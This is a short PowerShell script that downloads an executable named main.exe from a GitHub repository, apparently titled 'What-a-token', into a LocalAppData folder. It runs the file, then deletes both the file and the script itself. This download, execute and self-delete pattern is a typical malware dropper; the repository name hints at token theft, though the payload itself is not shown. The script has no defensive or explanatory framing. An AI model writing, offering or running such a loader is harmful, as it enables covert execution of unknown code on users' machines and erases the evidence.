$localAppData = "$env:LOCALAPPDATA\DownloadedTools"
$exeUrl = "https://github.com/AFRAID-FOR-YOU/What-a-token/raw/refs/heads/main/main.exe"
$exePath = "$localAppData\main.exe"
$selfPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $null }

# Ensure target directory exists
if (-Not (Test-Path -Path $localAppData)) {
    try {
        New-Item -ItemType Directory -Path $localAppData -Force | Out-Null
        Write-Host "Created directory: $localAppData"
    } catch {
        Write-Error "Failed to create directory: $_"
        exit 1
    }
}

# Download the executable
try {
    Write-Host "Downloading executable from $exeUrl..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
    Write-Host "Downloaded successfully to $exePath"
} catch {
    Write-Error "Failed to download: $_"
    exit 1
}

# Run the executable
try {
    Write-Host "Running the downloaded executable..."
    Start-Process -FilePath $exePath -Wait -NoNewWindow
    Write-Host "Execution completed."
} catch {
    Write-Error "Error during execution: $_"
}

# Cleanup - delete the downloaded file and then this script (if running from file)
try {
    Write-Host "Cleaning up..."
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force
    }

    if ($selfPath -and (Test-Path $selfPath)) {
        Start-Sleep -Seconds 1
        Remove-Item -Path $selfPath -Force
    }
    Write-Host "Cleanup done."
} catch {
    Write-Error "Cleanup failed: $_"
}
